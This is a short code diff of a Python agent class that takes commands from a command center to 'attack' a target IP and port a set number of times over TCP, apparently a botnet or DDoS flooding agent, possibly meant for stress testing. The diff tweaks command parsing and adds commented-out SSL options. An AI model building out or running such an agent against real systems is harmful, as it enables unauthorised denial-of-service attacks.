@@ -99,7 +99,7 @@ class AgentInstance:
             
 
                         # Attack the target
-                        if data['GOAL'] == "ATTACK" and self.COMMAND_CENTER:
+                        if "ATTACK" in data and self.COMMAND_CENTER:
                             print(
                                 f"\033[1;95mDebug: Instructed to attack '{data['TARGET'].upper()}' on protocol: '{data['PROTOCOL'].upper()}' * '{data['HITS']}' times")
 
@@ -129,7 +129,7 @@ class AgentInstance:
             finally:
                 connection.close()
 
-    def attack(self, IP, PORT, HITS, PROTOCOL="TCP", data=b"Attack Message"):
+    def attack(self, IP, PORT, HITS, PROTOCOL="TCP", data=b"Attack Message"):#, CIPHER="ECDHE-ECDSA-AES128-GCM-SHA256", SSLCONTEXT='ssl.PROTOCOL_TLSv1_2' ):
         # list for storing the sockets
         _sockets = []
         # list for storing the roundtriptimes whom we send back to the command center
@@ -142,6 +142,8 @@ class AgentInstance:
 
             if PROTOCOL == 'TCP':
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                #context = ssl.SSLContext(SSLCONTEXT)
+                #context.set_ciphers(CIPHER)
                 _sockets.append(s)
             # print(f"\033[1;95mDebug: attacking on TCP per the Attack function")
 
